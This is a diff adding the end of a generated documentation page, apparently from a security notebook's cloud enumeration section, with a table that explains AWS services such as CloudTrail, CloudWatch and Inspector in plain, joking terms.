+<tr><td>Machine Learning</td><td>Skynet</td><td>Predict future behavior from existing data for problems like fraud detection or "people that bought x also bought y."</td><td></td></tr>
+<tr><td>SWF</td><td>Amazon EC2 Queue</td><td>Build a service of "deciders" and "workers" on top of EC2 to accomplish a set task. Unlike SQS - logic is set up inside the service to determine how and what should happen.</td><td>IronWorker</td></tr>
+<tr><td>Snowball</td><td>AWS Big Old Portable Storage</td><td>Get a bunch of hard drives you can attach to your network to make getting large amounts (Terabytes of Data) into and out of AWS.</td><td>Shipping a Network Attached Storage device to AWS</td></tr>
+<tr><td>CloudFormation</td><td>Amazon Services Setup</td><td>Set up a bunch of connected AWS services in one go.</td><td></td></tr>
+<tr><td>CloudTrail</td><td>Amazon Logging</td><td>Log who is doing what in your AWS stack (API calls).</td><td></td></tr>
+<tr><td>CloudWatch</td><td>Amazon Status Pager</td><td>Get alerts about AWS services messing up or disconnecting.</td><td>PagerDuty, Statuspage</td></tr>
+<tr><td>Config</td><td>Amazon Configuration Management</td><td>Keep from going insane if you have a large AWS setup and changes are happening that you want to track.</td><td></td></tr>
+<tr><td>OpsWorks</td><td>Amazon Chef</td><td>Handle running your application with things like auto-scaling.</td><td></td></tr>
+<tr><td>Trusted Advisor</td><td>Amazon Pennypincher</td><td>Find out where you're paying too much in your AWS setup (unused EC2 instances, etc.).</td><td></td></tr>
+<tr><td>Inspector</td><td>Amazon Auditor</td><td>Scans your AWS setup to determine if you've setup it up in an insecure way</td><td>Alert Logic</td></tr>
+</tbody></table>
+</div>
+<h2 id="aws-vs-ad"><a class="header" href="#aws-vs-ad">AWS vs AD</a></h2>
+<p><img src="../../.gitbook/assets/image%20(3).png" alt="" /></p>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="../../enumeration/cloud/cloud-info-recon.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+
+                            <a rel="next prefetch" href="../../enumeration/cloud/azure.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="../../enumeration/cloud/cloud-info-recon.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+
+                    <a rel="next prefetch" href="../../enumeration/cloud/azure.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+        <!-- Livereload script (if served using the cli tool) -->
+        <script>
+            const wsProtocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
+            const wsAddress = wsProtocol + "//" + location.host + "/" + "__livereload";
+            const socket = new WebSocket(wsAddress);
+            socket.onmessage = function (event) {
+                if (event.data === "reload") {
+                    socket.close();
+                    location.reload();
+                }
+            };
+
+            window.onbeforeunload = function() {
+                socket.close();
+            }
+        </script>
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="../../elasticlunr.min.js"></script>
+        <script src="../../mark.min.js"></script>
+        <script src="../../searcher.js"></script>
+
+        <script src="../../clipboard.min.js"></script>
+        <script src="../../highlight.js"></script>
+        <script src="../../book.js"></script>
+
+        <!-- Custom JS scripts -->
+
+
+    </div>
+    </body>
+</html>
